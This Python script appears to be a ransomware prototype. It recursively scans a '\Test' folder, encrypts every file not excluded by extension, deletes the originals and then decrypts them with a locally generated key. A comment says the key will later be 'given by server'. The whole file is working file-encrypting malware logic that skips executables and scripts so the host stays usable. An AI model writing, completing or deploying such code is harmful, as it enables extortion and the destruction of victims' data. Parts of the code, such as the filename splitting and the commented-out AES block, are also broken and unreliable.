import os
from pathlib import Path
from Crypto.Cipher import AES
# temporary
from cryptography.fernet import Fernet

import json
from base64 import b64encode
from Crypto.Random import get_random_bytes

def recursiveScan(baseDir):
    # scan current directory
    for entry in os.scandir(baseDir):
        if entry.is_file():
            # is file
            yield entry
        else:
            # if folder, start a new scan of contents
            yield from recursiveScan(entry.path)


def encrypt(file, key):
    f = Fernet(key)

    with open(file, 'rb') as fl:
        original = fl.read()
    
    encrypted = f.encrypt(original)

    filename, extension = str(file).split('.')
    filename += '_encrypted.'
    encFile = Path(filename + extension)
    with open(encFile, 'wb+') as fl:
        fl.write(encrypted)
    os.remove(file)


def decrypt(file, key):
    f = Fernet(key)

    with open(file, 'rb') as fl:
        encrypted = fl.read()
    
    decrypted = f.decrypt(encrypted)


    filename, extension = str(file).split('.')
    filename = filename.split('_encrypted')[0]

    filename += '_decrypted.'
    decFile = Path(filename + extension)

    with open(decFile, 'wb+') as fl:
        fl.write(decrypted)

    '''
    extension = file.suffix.lower()
    with open(file, 'rb') as f:
        data = bytes(f.read())

    try:
        b64 = json.loads(json_input)
        nonce = b64decode(b64['nonce'])
        ct = b64decode(b64['ciphertext'])
        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
        pt = cipher.decrypt(ct)
        print("The message was: ", pt)
    except (ValueError, KeyError):
        print("Incorrect decryption")
    '''


# key is given by server
### Temporary
key = Fernet.generate_key()
### ----------

exclude = ['.py','.pem', '.exe', '.imin']
for item in recursiveScan(os.getcwd() + '\Test'): 
    filePath = Path(item)
    extension = filePath.suffix.lower()

    if extension in exclude:
        continue
    encrypt(filePath, key)
    print('Encrypted ' + str(filePath))

for item in recursiveScan(os.getcwd() + '\Test'): 
    filePath = Path(item)
    extension = filePath.suffix.lower()


    if extension in exclude:
        continue
    decrypt(filePath, key)